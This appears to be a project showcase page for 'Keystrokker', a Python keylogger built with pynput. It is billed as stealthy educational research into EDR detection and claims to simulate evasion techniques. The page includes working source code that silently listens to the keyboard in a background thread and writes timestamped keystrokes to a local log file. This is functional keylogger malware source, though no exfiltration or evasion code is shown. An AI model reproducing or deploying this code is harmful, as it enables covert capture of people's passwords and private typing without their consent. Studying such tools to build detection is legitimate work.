Keystrokker
Python · pynput

A stealth keystroke logging tool built with pynput for educational security research. Captures and timestamps inputs, simulates basic endpoint evasion techniques, and writes to a local log file. Built to understand how EDR tools detect malicious input capture.

  • Cross-platform keyboard listener via pynput
  • Timestamped keystroke logging to file
  • Special key handling (Enter, Backspace, etc.)
  • Runs silently in a background thread
  • Simulates basic endpoint evasion techniques
  • Educational: understand EDR detection logic
Python 3pynputthreadingdatetimefile I/O
# keystrokker.py from pynput import keyboard from datetime import datetime import threading class Keystrokker: def __init__(self, log="log.txt"): self.log = log self.buffer = [] def _on_press(self, key): ts = datetime.now().strftime("%H:%M:%S") try: self.buffer.append(f"[{ts}] {key.char}") except AttributeError: self.buffer.append(f"[{ts}] <{key}>") self._flush() def _flush(self): with open(self.log, "a") as f: f.write("\n".join(self.buffer)+"\n") self.buffer = [] def start(self): keyboard.Listener( on_press=self._on_press ).start()
